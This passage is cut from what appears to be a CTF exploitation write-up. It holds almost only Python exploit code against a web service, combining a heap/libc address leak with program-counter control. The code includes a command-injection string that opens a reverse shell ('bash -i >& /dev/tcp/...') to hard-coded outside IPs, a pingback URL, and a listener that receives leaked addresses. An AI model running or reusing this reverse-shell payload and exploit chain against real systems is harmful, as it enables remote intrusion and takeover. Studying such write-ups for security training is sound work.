</span></span><span class="line"><span class="cl"><span class="n">SECRET_FOR_FLOW</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x4242424200000000</span> <span class="o">+</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="n">PAYLOAD_OFFSET</span> <span class="o">=</span> <span class="p">[</span><span class="mi">258</span><span class="p">,</span> <span class="mi">550</span><span class="p">,</span> <span class="mi">729</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">517</span><span class="p">,</span> <span class="mi">941</span><span class="p">,</span> <span class="mi">999</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">490</span><span class="p">,</span> <span class="mi">544</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">COMMAND</span> <span class="o">=</span> <span class="s1">&#39; ; bash -c &#34;bash -i &gt;&amp; /dev/tcp/18.143.50.149/6666 0&gt;&amp;1&#34;; dy78912yh3&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">off</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">PAYLOAD_OFFSET</span><span class="p">,</span> <span class="n">PAYLOAD</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">SECRET_FOR_FLOW</span><span class="p">[</span><span class="n">off</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="n">RANDOMISH_STRING_FOR_FLOWER</span><span class="p">[</span><span class="n">off</span><span class="p">]</span> <span class="o">=</span> <span class="n">RANDOMISH_STRING_FOR_FLOWER</span><span class="p">[</span><span class="n">off</span><span class="p">][:</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">)]</span> <span class="o">+</span> <span class="n">COMMAND</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s2">&#34;omguser&#34;</span><span class="p">,</span> <span class="s2">&#34;omgpass&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">s</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="n">M</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">s</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="n">FLOWER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">trange</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="s2">&#34;http://127.0.0.1/&#34;</span> <span class="o">+</span> <span class="n">RANDOMISH_STRING_FOR_M</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mh">0x4141414100000000</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">trange</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="n">FLOWER</span><span class="p">,</span> <span class="s2">&#34;http://127.0.0.2/&#34;</span> <span class="o">+</span> <span class="n">RANDOMISH_STRING_FOR_FLOWER</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">SECRET_FOR_FLOW</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Wait for auto vacuum</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="n">FLOWER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the full script to automate all the process which combined both the leak and PC control POCs (Thanks to Riatre):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Any</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tqdm</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># SERVER_URL = &#34;http://3.113.243.230:3000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">SERVER_URL</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="s2">&#34;http://127.0.0.1:3000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">HEAP_OFF</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="mh">0x6000</span>
</span></span><span class="line"><span class="cl"><span class="c1"># PINGBACK_URL = &#34;http://35.72.245.211:4&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># PINGBACK_URL = &#34;http://3.113.243.230:4&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PINGBACK_URL</span> <span class="o">=</span> <span class="s2">&#34;http://54.90.103.135:5&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">COMMAND</span> <span class="o">=</span> <span class="s1">&#39; ; bash -c &#34;bash -i &gt;&amp; /dev/tcp/35.72.245.211/6666 0&gt;&amp;1&#34;; dy78912yh3&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># logging.basicConfig(level=logging.DEBUG)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># import http.client</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># httpclient_logger = logging.getLogger(&#34;http.client&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># def httpclient_logging_patch(level=logging.DEBUG):</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     &#34;&#34;&#34;Enable HTTPConnection debug logging to the logging framework&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#     def httpclient_log(*args):</span>
</span></span><span class="line"><span class="cl"><span class="c1">#         httpclient_logger.log(level, &#34; &#34;.join(args))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#     # mask the print() built-in in the http.client module to use</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     # logging instead</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     http.client.print = httpclient_log</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     # enable debugging</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     http.client.HTTPConnection.debuglevel = 1</span>
</span></span><span class="line"><span class="cl"><span class="c1"># httpclient_logging_patch()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">url_for</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">SERVER_URL</span> <span class="o">+</span> <span class="n">path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/2e7970cbec/loggingIn&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;redirectTo&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">watch</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">kind</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">secret</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">secret</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/34a106c003/transacting&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;watch&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">kind</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;url&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">url</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;secret&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">secret</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">204</span><span class="p">,</span> <span class="mi">302</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">=}</span><span class="s2"> </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="si">=}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">loc</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Location&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">loc</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;/?watchId=&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">loc</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="s2">&#34;/?watchId=&#34;</span><span class="p">)</span> <span class="p">:])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">unwatch</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">kind</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">watch_id</span><span class="p">:</span> <span class="nb">int</span> <span class="o">|</span> <span class="kc">None</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;unwatch&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">kind</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">watch_id</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">watch_id</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/34a106c003/transacting&#34;</span><span class="p">),</span> <span class="n">files</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">notify</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">kind</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">]</span> <span class="o">=</span> <span class="p">{})</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/34a106c003/transacting&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;notify&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">kind</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="n">k</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">items</span><span class="p">()},</span>
</span></span><span class="line"><span class="cl">            <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">204</span><span class="p">,</span> <span class="mi">302</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;notify failed </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">=}</span><span class="s2"> </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="si">=}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">204</span><span class="p">,</span> <span class="mi">302</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak_receiver</span><span class="p">(</span><span class="n">finish_ev</span><span class="p">,</span> <span class="n">result_dict</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">handle_client</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="sa">b</span><span class="s2">&#34;kind=&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">+=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;recv_data: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;kind=rum&#34;</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="sa">b</span><span class="s2">&#34;kind=anchor&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pos</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34; HTTP/1.1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">addr</span><span class="p">,</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&lt;Q&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span><span class="n">pos</span><span class="p">]</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;kind=rum&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">result_dict</span><span class="p">[</span><span class="s2">&#34;libc&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
